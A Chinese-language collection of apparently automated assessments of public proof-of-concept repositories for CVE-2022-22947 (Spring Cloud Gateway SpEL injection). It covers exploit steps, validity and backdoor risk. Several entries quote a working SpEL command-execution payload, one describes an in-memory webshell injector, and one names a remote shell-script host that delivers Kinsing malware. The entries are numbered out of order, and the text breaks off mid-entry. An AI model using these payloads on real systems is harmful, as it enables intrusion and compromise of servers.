**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

